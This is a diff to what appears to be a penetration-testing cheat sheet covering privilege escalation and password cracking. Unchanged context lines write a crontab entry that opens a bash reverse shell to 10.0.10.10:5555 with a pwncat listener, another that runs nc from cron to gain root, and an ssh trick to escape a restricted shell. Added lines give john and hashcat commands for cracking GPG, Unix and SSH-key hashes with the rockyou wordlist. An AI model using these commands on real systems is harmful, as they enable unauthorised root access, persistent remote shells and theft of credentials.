@@ -336,6 +336,7 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 <b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
 
+
 <b>From crontab to bash</b>
 
 example 1.
@@ -345,6 +346,7 @@ First start listner<code>pwncat -l -p 5555</code>
 then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
 
 Then you just have to look and wait in your lister terminal for 1 min.
+
 
 
 <h1>Password Cracking</h1>
@@ -369,13 +371,24 @@ Extract crackable hash
 
 Crack Hash
 
-<code>john --format=gpg --wordlist=superlist.lst  wordlisthash-from-file</code>
+<code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>
 
 <b>Crack sha512 (deafult unix root hash)</b>
 
 <code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
 
-<b>Identify hash</b>
+<b>Crack SSH-Key</b>
+
+
+<code>ssh2john id_rsa_file >> extracted_hash</code>
+
+<code>john extracted_hash --wordlist=/opt/wordlists/rockyou.txt</code>
+
+"Don´t foreget to chmod 600 on the id_rsa file"
+
+
+
+<b>Identify your hash</b>
 
 example 1.
 
